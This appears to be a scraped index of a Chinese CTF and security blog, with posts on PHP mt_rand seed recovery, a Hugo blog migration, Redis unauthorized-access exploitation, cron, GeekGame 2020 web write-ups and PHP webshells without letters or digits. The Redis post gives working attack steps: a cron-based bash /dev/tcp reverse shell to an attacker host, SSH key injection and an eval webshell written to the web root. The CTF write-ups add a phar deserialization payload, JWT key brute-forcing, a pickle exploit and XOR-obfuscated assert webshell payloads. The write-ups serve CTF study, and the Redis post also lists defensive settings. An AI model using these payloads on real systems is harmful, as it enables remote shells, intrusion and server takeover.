","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:3:4","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"0x03 逆操作综合 将各个函数的逆操作综合一下，在我们已知相距 227 的两个随机数 rand[i] 与 rand[i-227] 和对应的 i 的情况下，state_reload[i] 与 state_reload[i-227] 的取值共有四种组合，对每一种组合分别进行逆操作得到种子，并通过测试确定正确的种子 (一般来说只有一种组合可以得到有效的种子) 简单写了一个 mt_rand 种子还原的程序 #include \u003cstdio.h\u003e#include \u003cstdint.h\u003e #define N (624) #define M (397) #define hiBit(u) ((u) \u0026 0x80000000U) #define loBit(u) ((u) \u0026 0x00000001U) #define loBits(u) ((u) \u0026 0x7FFFFFFFU) #define mixBits(u, v) (hiBit(u)|loBits(v)) #define twist(m,u,v) (m ^ (mixBits(u,v)\u003e\u003e1) ^ ((uint32_t)(-(int32_t)(loBit(v))) \u0026 0x9908b0dfU)) #define twist_php(m,u,v) (m ^ (mixBits(u,v)\u003e\u003e1) ^ ((uint32_t)(-(int32_t)(loBit(u))) \u0026 0x9908b0dfU)) static inline void php_mt_initialize(uint32_t seed, uint32_t *state) { uint32_t *s = state; uint32_t *r = state; int i = 1; *s++ = seed \u0026 0xffffffffU; for( ; i \u003c N; ++i ) { *s++ = ( 1812433253U * ( *r ^ (*r \u003e\u003e 30) ) + i ) \u0026 0xffffffffU; r++; } } static inline void php_mt_reload(uint32_t *state, uint32_t mode) { uint32_t *p = state; int i; if (mode == 0) { for (i = N - M; i--; ++p) *p = twist(p[M], p[0], p[1]); for (i = M; --i; ++p) *p = twist(p[M-N], p[0], p[1]); *p = twist(p[M-N], p[0], state[0]); } else { for (i = N - M; i--; ++p) *p = twist_php(p[M], p[0], p[1]); for (i = M; --i; ++p) *p = twist_php(p[M-N], p[0], p[1]); *p = twist_php(p[M-N], p[0], state[0]); } } uint32_t reverse_php_mt_rand(uint32_t s1) { uint32_t s2; s1 ^= (s1 \u003e\u003e 18); s1 ^= (s1 \u003c\u003c 15) \u0026 0xefc60000U; s2 = (s1 \u003c\u003c 21) ^ (((s1 \u003c\u003c 7) \u0026 0x9d2c5680U) \u003c\u003c 21); s2 = (s1 \u003c\u003c 14) ^ (s2 \u0026 (0x9d2c5680U \u003c\u003c 14)); s2 = (s1 \u003c\u003c 7) ^ (s2 \u0026 (0x9d2c5680U \u003c\u003c 7)); s1 ^= s2 \u0026 0x9d2c5680U; s1 ^= (s1 \u003e\u003e 11); s1 ^= (s1 \u003e\u003e 22); return s1; } uint32_t reverse_php_mt_initialize(uint32_t si, uint32_t i) { for (uint32_t j = i; j \u003e 0; j--) { uint32_t temp = (0x9638806dU * (si - j)) \u0026 0xffffffffU; si = temp ^ (temp \u003e\u003e 30); } return si; } uint32_t reverse_php_mt_reload_0(uint32_t sri, uint32_t sri_227, uint32_t i) { uint32_t si_1_lsb = (sri ^ sri_227) \u003e\u003e 31; // LSB of state[i+1] uint32_t mix = (sri ^ sri_227) ^ (si_1_lsb ? 0x9908b0dfU : 0); uint32_t si_1_31 = (mix \u003c\u003c 2 \u003e\u003e 1) | si_1_lsb; // 0~30 bits of state[i+1] for (uint32_t h = 0; h \u003c 2; h++) { uint32_t si_1 = si_1_31 | (h \u003c\u003c 31); uint32_t seed = reverse_php_mt_initialize(si_1, i + 1); uint32_t state[N]; php_mt_initialize(seed, state); php_mt_reload(state, 0); if (state[i-227] == sri_227) { return seed; } } return 0; } uint32_t reverse_php_mt_reload_1(uint32_t sri, uint32_t sri_227, uint32_t i) { uint32_t si_lsb = (sri ^ sri_227) \u003e\u003e 31; // LSB of state[i] uint32_t mix = (sri ^ sri_227) ^ (si_lsb ? 0x9908b0dfU : 0); uint32_t si_1_1_30 = mix \u003c\u003c 2 \u003e\u003e 1; // 1~30 bits of state[i+1] for (uint32_t h = 0; h \u003c 2; h++) { for (uint32_t l = 0; l \u003c 2; l++) { uint32_t si_1 = si_1_1_30 | l | (h \u003c\u003c 31); uint32_t seed = reverse_php_mt_initialize(si_1, i + 1); uint32_t state[N]; php_mt_initialize(seed, state); php_mt_reload(state, 1); if (state[i-227] == sri_227) { return seed; } } } return 0; } int main() { uint32_t i; // index of one random number uint32_t ri_227; // rand[i-227] uint32_t ri; // rand[i] uint32_t mode; // 0 for MT_RAND_MT19937 / 1 for MT_RAND_PHP printf(\"i(\u003e=227):\"); scanf(\"%u\", \u0026i); printf(\"rand[i-227]([%u]):\", i - 227); scanf(\"%u\", \u0026ri_227); printf(\"rand[i]([%u]):\", i); scanf(\"%u\", \u0026ri); printf(\"mode(0/1):\"); scanf(\"%u\", \u0026mode); for (uint32_t a = 0; a \u003c 2; a++) { for (uint32_t b = 0; b \u003c 2; b++) { uint32_t sri = reverse_php_mt_rand((ri \u003c\u003c 1) | a); uint32_t sri_227 = reverse_php_mt_rand((ri_227 \u003c\u003c 1) | b); if (mode == 0) { printf(\"%u\\n\", reverse_php_mt_reload_0(sri, sri_227, i)); } else { printf(\"%u\\n\", reverse_php_mt_reload_1(sri, sri_227, i)); } } } return 0; } ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:4:0","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"0x04 测试 通过 0x01 中的题对上述代码进行简单测试 首先生成 228 个随机数，由于加密时已经生成 2 个随机数，所以此时输出第一个随机数为 rand[2]，最后一个随机数为 rand[229] /flag.php?pass=nya_nop_nya~\u0026roll=228 生成 288 个随机数random number generation \" 生成 288 个随机数 使用上述代码进行种子还原操作，其中 i 为 229，mode 为 0 还原随机数种子seed recovery \" 还原随机数种子 比较结果可知，随机数种子应为 15370470，使用该种子生成随机数对给定加密信息进行解密即可得到 flag 解密得到 flagflag \" 解密得到 flag ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:5:0","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"0x05 后记 众所周知，不会密码学的二进制不是一个合格的 Web 手（x ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:6:0","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["心路历程"],"content":" 前几天猛然发现自己的博客已经好多天没更新了，翻了一圈发现博客源码也被我弄丢了，由于不想再配一遍 Hexo 和依赖的各种库（其实就是懒，索性直接把博客迁移到了 Hugo ","date":"2021-05-31","objectID":"/posts/blog-migration/:0:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x00 安装 Hugo Windows 用户只能说 Scoop 真香 scoop install hugo-extended 至于为什么要安装 extened 版本，其实我最开始装的是另一个版本，然后发现好多主题都用不了，比如普通版本就没有 scss 支持，Google 了一圈才发现需要装 extended 顺带一提，原来 Hugo 的 Stars 已经超过 Jekyll 了 ","date":"2021-05-31","objectID":"/posts/blog-migration/:1:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x01 选主题 众所周知，搭博客最难的一步是选一个好看的主题（曾经因为没找到好看的主题而放弃了 Wordpress 把官方的主题列表翻了个底朝天，最后选了这个最符合我审美的 LoveIt，国人开发的，还是中文文档看着舒服 简单看了一下介绍，功能挺齐全的，搜索评论这些功能都是开箱即用，还记得之前 Hexo 那个主题为了加个搜索功能自己改了半天模板 主题的文档写的挺全面的，各个配置项都有明确的介绍，用到什么就到文档里搜索一下就好，这里说两个文档里没有涉及到的问题 ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"Algolia Search 的配置 在博客里配置基于 Algolia 的搜索功能只需要在配置文件里加几个相关的配置项就可，这里说一下将生成的 json 上传到 Algolia 以应用搜索的操作 这里博客的作者推荐了一个基于 nodejs 的库 Algolia Atomic，由于懒得配 nodejs 而且 Algolia 官方 API 其实非常完善，我就直接用 python 糊了一个小脚本，由于我把博客的部署直接放到了 Github Action 上，所以就约等于每次部署都自动上传了，这里就随便放一下糊出来的脚本 from algoliasearch.search_client import SearchClient import json import os import sys def read_json(filename: str) -\u003e list: with open(filename, 'r', encoding='utf-8') as file: return json.load(file) def main(): if len(sys.argv) != 2: print(\"Filename is needed.\") exit(1) filename = sys.argv[1] ALGOLIA_APPID = os.getenv('ALGOLIA_APPID') ALGOLIA_ADMIN_KEY = os.getenv('ALGOLIA_ADMIN_KEY') ALGOLIA_INDEX = os.getenv('ALGOLIA_INDEX') if ALGOLIA_APPID == None or ALGOLIA_ADMIN_KEY == None or ALGOLIA_INDEX == None: print(\"APPID and ADMIN_KEY and INDEX is needed.\") exit(1) client = SearchClient.create(ALGOLIA_APPID, ALGOLIA_ADMIN_KEY) index = client.init_index(ALGOLIA_INDEX) print(\"=== Clear Objects ===\") res = index.clear_objects() print(res.raw_responses) objects = read_json(filename) print(\"=== Add Objects ===\") res = index.save_objects(objects, {'autoGenerateObjectIDIfNotExist': True}) print(res.raw_responses) if __name__ == '__main__': main() ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:1","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"文章的加密 有的时候写的博客不想被别人看到怎么办呢，加密一下就好了 文章的加密对于基于 nodejs 这种脚本语言的 Hexo 来说简直轻而易举，npm 装个插件就完事了 但是 Hugo 是用 Golang 写的，没有那么好的插件化操作，找了一下找到了这个 Hugo Encryptor，还是 Vidar 的 Web 大佬写的（我直接膜 只是需要每次 build 之后多运行一个脚本，Github Action 加一行就好了 ","date":"2021-05-31","objectID":"/posts/blog-migration/:2:2","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x02 自动化部署 Hugo 的官方文档贴心的提供了 Github Action 部署的详细文档，我就在它的基础上稍作修改，一个是多运行了一些脚本（文章加密、上传 json），还有就是我的博客源码和 Github Pages 放在了不同仓库，需要推送到另一个仓库 这里把我的 workflow 配置也贴一下吧（随便糊的，大佬轻喷 name:Blogon:push:branches:- masterjobs:deploy:runs-on:ubuntu-18.04steps:- uses:actions/checkout@v2with:submodules:truefetch-depth:0- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:'latest'extended:true- name:Setup Othersrun:|sudo apt install python3 pip3 install --upgrade 'algoliasearch\u003e=2.0,\u003c3.0' --user pip3 install setuptools --user pip3 install -r plugins/hugo_encryptor/requirements.txt --user- name:Buildenv:ALGOLIA_ADMIN_KEY:${{ secrets.ALGOLIA_ADMIN_KEY }}ALGOLIA_APPID:${{ secrets.ALGOLIA_APPID }}ALGOLIA_INDEX:${{ secrets.ALGOLIA_INDEX }}run:|hugo python3 plugins/hugo_encryptor/hugo-encryptor.py python3 plugins/algolia_upload/upload.py public/index.json- name:Deployuses:peaceiris/actions-gh-pages@v3with:deploy_key:${{ secrets.ACTIONS_DEPLOY_KEY }}external_repository:X5tar/x5tar.github.iopublish_branch:masterpublish_dir:./publicfull_commit_message:${{ github.event.head_commit.message }} ","date":"2021-05-31","objectID":"/posts/blog-migration/:3:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":["心路历程"],"content":"0x03 尾记 这次迁移整体没遇到什么障碍，加起来也就不到两个小时就完成了，而且主要时间都用在选主题和复制粘贴原来的文章了，以后遇到什么问题再来更吧 溜了溜了，明天就考密码学了现在还没学完（ ","date":"2021-05-31","objectID":"/posts/blog-migration/:4:0","tags":["Blog","Hugo"],"title":"博客迁移记","uri":"/posts/blog-migration/"},{"categories":null,"content":"大佬们的博客（膜 Neorah：https://neorah.github.io/ evi0s：https://evi0s.com/ enivs0rt：https://enivs0rt.github.io/ Byaidu：https://www.cnblogs.com/algonote/ 戳戳龙：https://ccdragon.cc/ 木偶：https://muouim.github.io/ ","date":"2021-05-31","objectID":"/friends/:0:0","tags":null,"title":"🌟's Friends","uri":"/friends/"},{"categories":null,"content":"自我介绍（迫真 某男子职业技术学院在读 CNSS / CTFer / WEB🐶 跟随大佬们脚步的菜鸡 业余代码搬运工 LOL 最强黑铁，0 / 21 / 0 ","date":"2021-05-31","objectID":"/about/:0:0","tags":null,"title":"About 🌟","uri":"/about/"},{"categories":["Security"],"content":"0x00 前言 刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:1:0","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"0x01 Redis 介绍 Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库 Redis 通常将全部的数据存储在内存中，但也可以将数据持久化存储在硬盘中（数据持久化给了我们利用的机会） ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:2:0","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"0x02 环境搭建 安装 redis 后，在配置文件 redis.conf 中 bind 127.0.0.1 ::1 一行前加 # 将其注释，并将 protected-mode 设为 no ，然后启动 redis-server 然后在攻击机上输入 redis-cli -h 目标IP 命令连接目标机器的 redis-server，若连接成功则环境搭建完成 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:3:0","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"0x03 利用方法 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:0","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"1. 利用 Cron 定时任务反弹 shell 关于 Linux Cron 定时任务见另一篇博客 [Linux Cron 定时任务](https://x5tar.com/2020/06/21/linux-crontab/) 本方法适用于目标机器以 root 身份启动 Redis 的情况 先在攻击机上监听任意端口 nc -lvvp Port 然后在连接的 redis-cli 执行以下命令（第一行命令可以换为其它任何可以反弹 shell 的命令） \u003e set x \"\\n* * * * * bash -i \u003e\u0026 /dev/tcp/攻击机IP/Port 0\u003e\u00261\\n\" OK \u003e config set dir /var/spool/cron/ OK \u003e config set dbfilename root OK \u003e save OK 稍等片刻即可在攻击机接收到回弹的 shell 若长时间未接收到，可尝试将第二行命令中的目录改为 /var/spool/cron/crontabs 再次尝试 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:1","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"2. 写入公钥并利用 ssh 连接 本方法适用于目标机器安装并启动了 ssh server 的情况 使用本方法需要知道启动 redis 的用户的 home 目录 先在攻击机生成 ssh 公钥（已存在公钥无需重复生成，防止覆盖） ssh-keygen -t rsa 然后在 ~/.ssh 目录下执行以下命令 (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") | redis-cli -h 目标机器IP -x set x 然后在连接的 redis-cli 执行以下命令（此处假设用户为 root，home 目录为 /home） \u003e config set dir /root/.ssh OK \u003e config set dbfilename authorized_keys OK \u003e save OK 然后在攻击机通过 ssh 连接目标机器即可 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:2","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"3. 写入 webshell 本方法适用于 redis 用户权限较低但对 web 目录有写权限的情况 使用本方法需要知道 web 目录的绝对路径 在连接的 redis-cli 执行以下命令（此处假设目标机器运行 PHP） \u003e set x \"\\n\u003c?php eval($_POST['cmd']); ?\u003e\\n\" OK \u003e config set dir /var/www/html OK \u003e config set dbfilename evil.php OK \u003e save OK 然后连接 webshell 即可 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:3","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"4. 利用 lua 脚本进行操作 在其它地方看到的，但是在 Redis 里甚至连 IO 库和 OS 库都不能用，暂未发现可靠的利用方法 从 Redis 2.6.0 版本开始，Redis 内置了 lua 解释器，可以通过 lua 脚本进行一些操作 \u003e eval \"return 'hello'\" 0 \"hello\" ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:4","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"5. 其它方法 既然通过 Redis 未授权访问获得了写入文件的权限，则可根据目标机器启动的服务，针对性的使用其它方法进行进一步渗透 ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:4:5","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["Security"],"content":"0x04 安全配置 Redis 未授权访问危害较大，故根据以上利用方法，可针对性的进行以下配置，增强安全性 仅绑定部分地址，限制可访问的 IP 修改 Redis 监听端口 为用户设置密码 以单独的低权限用户启动 Redis，并禁止登录 禁止使用或修改高危命令名称（rename-command） ","date":"2020-06-23","objectID":"/posts/redis-unauthorized-access/:5:0","tags":["Redis"],"title":"Redis 未授权访问","uri":"/posts/redis-unauthorized-access/"},{"categories":["随便学学"],"content":"0x00 前言 在做一道涉及到 redis 未授权访问的题的时候，看到了使用到 /var/spool/cron/ 目录反弹 shell 后查询得知 Linux Cron 定时任务，在此记录下来 ","date":"2020-06-21","objectID":"/posts/linux-crontab/:1:0","tags":["Linux","Cron"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["随便学学"],"content":"0x01 相关文件 与 Cron 相关的文件主要存在以下几个目录 /var/spool/cron/ 目录下存放的是每个用户的 crontab 任务，每个任务以创建者的名字命名 /etc/crontab 这个文件负责调度各种管理和维护任务 /etc/cron.d/ 这个目录用来存放任何要执行的 crontab 文件或脚本 我们还可以把脚本放在/etc/cron.hourly 、 /etc/cron.daily 、 /etc/cron.weekly 、 /etc/cron.monthly 目录中，让它每小时/天/星期/月执行一次 其中 /var/spool/cron/ 为最常用的脚本存放位置，一般由 crontab 命令操作 ","date":"2020-06-21","objectID":"/posts/linux-crontab/:2:0","tags":["Linux","Cron"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["随便学学"],"content":"0x02 Crontab 命令操作 查看 crontab 命令的帮助如下 Usage: crontab [options] file crontab [options] crontab -n [hostname] Options: -u \u003cuser\u003e define user -e edit user's crontab -l list user's crontab -r delete user's crontab -i prompt before deleting -n \u003chost\u003e set host in cluster to run users' crontabs -c get host in cluster to run users' crontabs -V print version and exit -x \u003cmask\u003e enable debugging 其中常用的选项有 -e 、 -l 、 -r -e 用于编辑配置文件（即使用默认编辑器编辑 /var/spool/cron/$USER 文件） -l 用于读取配置文件（即显示 /var/spool/cron/$USER 文件内容） -r 用于删除配置文件（即删除 /var/spool/cron/$USER 文件） ","date":"2020-06-21","objectID":"/posts/linux-crontab/:3:0","tags":["Linux","Cron"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["随便学学"],"content":"0x03 配置文件内容 做题过程中用到的文件为 /var/spool/cron/root 注意： /var/spool/cron/ 目录所有者为 root，权限为 755，只有 root 用户才能创建文件 但 crontab 生成的配置文件所有者为创建的用户为创建用户，权限为 600 所以只有在以 root 用户登录或当前登录用户已创建定时任务时才可直接修改该文件 写入的内容为（其中 command 即为反弹 shell 的命令） * * * * * command 该文件中一行命令由六部分组成，前五部分分别为 分、时、日、月、周，最后一部分为待执行的命令 时间部分可用的操作符有 * 所有时间 / 时间间隔 - 时间范围 , 单独的时间 所以上述写入内容为每隔一分钟执行一次 command，即可达到自动执行的目的 另附几个上述操作符的使用示例 */10 8-16 * * * command 每天的 8-16 时每 10 分钟执行一次 0,30 * * * * command 每小时的 0 分和 30 分各执行一次 0 9 */2 * * command 每隔两天的 9:00 执行一次 0,20,40 8-16 * * 6,0 command 每周六和周日的 8-16 时的 0 20 40 分各执行一次 ","date":"2020-06-21","objectID":"/posts/linux-crontab/:4:0","tags":["Linux","Cron"],"title":"Linux Cron 定时任务","uri":"/posts/linux-crontab/"},{"categories":["WriteUp"],"content":"前言 被川大的同学叫来打这个比赛 嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多… 比赛的时候就做出来一道 WEB（真的菜 ","date":"2020-05-27","objectID":"/posts/geekgame2020/:1:0","tags":["GeekGame 2020","Web 安全"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["WriteUp"],"content":"二次注入 真的是这次比赛最简单的一道题了 最常规的二次注入 先注册一个名为 admin'# 的用户，登录后修改密码 再用 admin 和修改后的密码登录即可 比赛的时候没发现有源码泄露，直接看 SQL 语句可能更直观一些 $x=$db-\u003eexecute(\"update users set password=? where username='$username' \",['s',\u0026$password]); ","date":"2020-05-27","objectID":"/posts/geekgame2020/:2:0","tags":["GeekGame 2020","Web 安全"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["WriteUp"],"content":"反序列化？ 打开是个文件上传，只能上传图片，并且有个 vulnerable.php \u003c?php highlight_file(__FILE__); if (isset($_GET['filename'])) { $filename = $_GET['filename']; } else { $filename = \"\"; } class Flag { private $code; function __destruct() { // TODO: Implement __destruct() method. eval($this-\u003ecode); } } if (file_exists($filename)) { echo \"文件存在的呢;\"; } else { echo \"啊这，文件不在哦\"; } ?\u003e 题名加了个问号，那就不是反序列化，但是还不知道怎么做 看了官方 WP，这真的涉及到我的知识盲区了 vulnerable.php 中用到了 file_exists 函数 自 PHP 5.0.0 起, 此函数也用于某些 URL 包装器 file_exists函数在检查 phar 包的时候会将其解析 用如下 payload 生成 phar 包 \u003c?php class Flag { private $code; function __construct($my_code) { $this-\u003ecode = $my_code; } function __destruct() { eval($this-\u003ecode); } } $phar = new Phar('a.phar'); $phar-\u003estartBuffering(); $phar-\u003esetStub('GIF89a\u003c?php __HALT_COMPILER();?\u003e'); $object = new Flag('eval($_REQUEST[\"cmd\"]);'); $phar-\u003esetMetadata($object); $phar-\u003eaddFromString('a.txt', 'a'); $phar-\u003estopBuffering(); 注意添加文件头绕过文件类型检测，生成后改后缀为 gif 上传，再用 phar 协议读取即可 vulnerable.php?filename=phar://upload/a.gif ","date":"2020-05-27","objectID":"/posts/geekgame2020/:3:0","tags":["GeekGame 2020","Web 安全"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["WriteUp"],"content":"ezcode 直到比赛结束只有一解的题 打开可以注册和登录，注册返回一串 JWT，刚开始毫无思路，后来给了一个 hint hint ：top1000 ？top1000 弱口令吗 跑了一下果然跑出来了 key import jwt token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw' with open('top1000.txt', 'r') as f: top1000 = [i.strip() for i in f.readlines()] for i in top1000: test_token = jwt.encode({'username':'1234'}, algorithm='HS256', key=i).decode() if test_token == token: print('Found it!') print(i) print(jwt.encode({'username':'admin'}, algorithm='HS256', key=i).decode()) break 爆破 JWT Key 并修改内容JWT \" 爆破 JWT Key 并修改内容 用生成的 JWT 登录发现还有第二关，看一下源码有注释 want2know=xxx class RestrictedUnpickler(pickle.Unpickler): blacklist = { 'sys','eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit','getattr' } def find_class(self, module, name): # Only allow safe classes from builtins. if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() ... pickle_data=request.form.get('data') if pickle_data==None: return open('templates/pickle.html').read() try: pickle_data=base64.b64decode(pickle_data.encode()) op_blackli=[b'R'] for op in op_blackli: if op in pickle_data: return '数据非法！'+op.decode() data=restricted_loads(pickle_data) except Exception: return \"请输入正确的数据格式！\" try: secret=request.form.get('secret') except Exception: return open('templates/pickle.html') if want2know==secret: return flag else: return '欢迎使用HACHp1的pickle测试工具！' else: return '没有权限查看！\\n' 是一个 pickle 反序列化，只看出来禁止用 R 执行函数，然后就不会了（ 看了 WP 这里是利用 globals 或 locals 函数直接修改 want2know 使其与输入的 secret 相等 出题壬推荐用 pker 构建序列化 glo_dic=INST('builtins','globals') glo_dic['want2know']='test' return 生成 payload b\"(ibuiltins\\nglobals\\np0\\n0g0\\nS'want2know'\\nS'test'\\ns.\" base64 一下即可 ","date":"2020-05-27","objectID":"/posts/geekgame2020/:4:0","tags":["GeekGame 2020","Web 安全"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["WriteUp"],"content":"总结 第一道 WEB 比较照顾我这样的菜🐶 后两道 WEB 质量还是不错的，都涉及到了我不会的知识点 phar 和 pickle 似乎都是第一次做到 除了做不出来，体验挺不错的（ ","date":"2020-05-27","objectID":"/posts/geekgame2020/:5:0","tags":["GeekGame 2020","Web 安全"],"title":"GeekGame 2020 WEB 复现","uri":"/posts/geekgame2020/"},{"categories":["随便学学"],"content":"在做题的时候遇到了上传了 shell 脚本但是没有执行权限的情况 测试脚本 测试脚本shell \" 测试脚本 本地测试结果 没有执行权限denied \" 没有执行权限 然后就发现了 source 命令 使用 source 命令source \" 使用 source 命令 点命令（错误示范） 点命令的错误用法dot_error \" 点命令的错误用法 点命令（必须加 ./） 正确使用点命令dot \" 正确使用点命令 source 命令和点命令在作用上完全相同 而除了可以不需要执行权限外，source 命令（点命令）还有一个特性，即 source 命令是在本 shell 内执行，而 直接执行脚本是在新开 shell 中执行，即 source 命令可以设置当前 shell 的环境变量，故常用来使修改过的初始化文件（.bashrc .profile 等）立即生效 测试脚本 环境变量测试脚本env \" 环境变量测试脚本 直接执行 直接执行env_shell \" 直接执行 source 命令 使用 source 命令执行env_source \" 使用 source 命令执行 点命令 使用点命令执行env_dot \" 使用点命令执行 ","date":"2020-05-10","objectID":"/posts/source-command/:0:0","tags":["Linux"],"title":"Linux 中的 source 命令（点命令）","uri":"/posts/source-command/"},{"categories":["Security"],"content":"0x00 前言 又是好多天没写博客了，就想着再来随便水点什么吧 这种神奇的题曾经在 CNSS Recruit 2019 Web Boss题 中出现过，最近做题又遇到了一次结果还是不会（因为又多过滤了一些符号之前的方法就也不能用了），就把它写下来吧，具体方法有三种，可以灵活使用，这里使用的是 PHP5.6 环境，具体原因会在下文说明，源码如下 \u003c?php highlight_file(__FILE__); if(!preg_match('/[a-z0-9]/is',$_GET['code'])) { eval($_GET['code']); } else { die(\"nonono!\"); } ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:1:0","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"0x01 前置知识（PHP 中的一些特性） 可变函数，即可以用字符串变量充当函数名（eval 等语言结构不可使用） 如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它 \u003c?php $a = 'strrev'; $b = 'Hello'; echo $a($b); // olleH 可变变量，即在一个字符串变量前再加一个 $ 可将该变量的值当作变量名 一个可变变量可以获取一个普通变量的值作为这个可变变量的变量名 \u003c?php $a = 'hello'; $$a = 'world'; echo $hello; // world $hello = 'dlrow'; echo $$a; // dlrow ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:2:0","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"0x02 思路分析及三种方法 我们需要将各种符号进行变换组合，最终构造出各种字母数字，以执行所需命令 大致思路为构造 assert($_POST[_]) 获取 shell 这里说一下需要使用 PHP5 的原因 PHP5 中 assert 为函数，可以通过 $a='assert';$a(...) 的方式执行，这也是之后选用 assert 而不选用 eval 的原因 PHP7 中 assert 变为了和 eval 一样的语言结构，即不能再用以上方法执行 在这篇文章结尾我也会简要分析一下在 PHP7 中怎么操作 ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:0","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"法一：异或 异或即 PHP 中的运算符 ^ $a ^ $b Xor（按位异或） 将把 $a 和 $b 中一个为 1 另一个为 0 的位设为 1 两个字符串异或后仍是字符串 这应该是这三种方法中最常用的一个（因为 Google 查到最多的是这种方法），具体选用哪些字符进行异或直接查 ASCII 码表就好（构造小写字母采用反引号 ` ，构造大写字母采用 @ 比较方便） /?code=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%10'^'@').('%0F'^'@').('%13'^'@').('%14'^'@');$___=$$__;$_($___[_]); 整理一下即为以下代码 \u003c?php $_ = 'assert'; $__ = '_POST'; $___ = $$__; $_($___[_]); // assert($_POST[_]) ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:1","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"法二：取反 取反即 PHP 中的运算符 ~ ~$a Not（按位取反） 将 $a 中为 0 的位设为 1，反之亦然 字符串取反后仍是字符串 在异或运算符 ^ 被过滤时可以考虑这种方法，也是招新 BOSS 题中用到的方法，依然查 ASCII 码表 